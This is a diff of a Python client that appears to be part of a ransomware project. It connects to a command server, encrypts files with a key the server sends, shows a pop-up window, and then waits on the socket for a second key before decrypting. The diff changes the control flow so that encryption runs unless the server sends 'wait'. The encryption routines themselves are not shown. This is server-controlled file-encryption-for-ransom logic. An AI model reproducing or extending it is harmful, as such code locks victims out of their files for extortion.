@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 import socket
 import select
 import sys
-from threading import Thread
+from threading import *
 import uuid
 
 import interface
@@ -76,14 +76,10 @@ HOST = 'localhost'
 PORT = 5789
 
 BUFFER_SIZE = 1024
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 print('Connected!')
 s.send(MESSAGE)
-
-
-
 
 while True:
 
@@ -95,14 +91,23 @@ while True:
         if sock == s:
             data = s.recv(4096)
             if not data:
-               print('\nDisconnected from server')
-               sys.exit()
+                print('\nDisconnected from server')
+                sys.exit()
             
             else:
-                if data.decode() == 'XD':
-                   decryptFiles(key1)
+                key = data.decode()
+                # this will be the string "wait" in the future, telling the system not to encrypt
+                if data.decode() != 'wait':
+                    encryptFiles(key)
+                
 
-                else:
-                    key1 = data.decode()   
-                    encryptFiles(key1)
-                    interface.App().pop_up_win()
+                t1 = Thread(target=interface.App().pop_up_win)
+                t1.daemon = True
+                t1.start()
+
+                # wait for a signal to begin decryption
+                print('Thread worked!!!')
+                
+                # recv waits for new input of key to decrypt
+                key = s.recv(4096)
+                decryptFiles(key)
